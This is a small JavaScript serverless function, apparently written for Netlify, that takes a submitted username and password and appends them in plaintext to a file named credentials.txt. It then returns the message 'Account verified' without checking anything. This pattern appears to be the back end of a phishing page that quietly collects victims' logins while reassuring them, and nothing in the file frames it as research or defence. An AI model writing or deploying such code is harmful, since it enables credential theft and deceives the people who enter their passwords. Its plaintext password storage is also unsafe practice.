const fs = require('fs');
const path = require('path');

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Only POST requests are allowed' }),
        };
    }

    const { username, password } = JSON.parse(event.body);

    // Define the path to the temporary file in Netlify's /tmp directory
    const filePath = path.join('/tmp', 'credentials.txt');

    // Log the credentials to the temporary file
    const logEntry = `Username: ${username}, Password: ${password}\n`;
    fs.appendFileSync(filePath, logEntry);

    // Respond with a JSON success message
    return {
        statusCode: 200,
        body: JSON.stringify({ message: 'Account verified' }),
    };
};